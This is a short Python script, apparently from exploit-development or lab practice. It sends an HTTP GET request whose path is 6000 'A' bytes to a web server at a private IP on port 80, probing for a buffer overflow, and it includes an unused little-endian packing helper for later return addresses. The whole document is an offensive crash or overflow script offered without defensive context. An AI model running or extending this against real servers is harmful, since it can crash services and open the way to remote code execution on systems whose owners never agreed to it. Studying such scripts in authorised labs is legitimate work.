import struct
import socket
from pwn import *

def LE(num):
    return struct.pack('<I', num)

def send(payload, host='192.168.231.10', port=80):
    request  = b'GET /' + payload + b'HTTP/1.1' + b'\r\n'
    request += b'Host: ' + host.encode() + b'\r\n'
    request += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0' + b'\r\n'
    request += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + b'\r\n'
    request += b'Accept-Language: en-US,en;q=0.5' + b'\r\n'
    request += b'Accept-Encoding: gzip, deflate' + b'\r\n'
    request += b'Connection: keep-alive' + b'\r\n\r\n'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(request)
    s.close()

def main():
    buf = b"A" * 6000
    print(len(buf))
    send(buf)

if __name__ == '__main__':
    main()
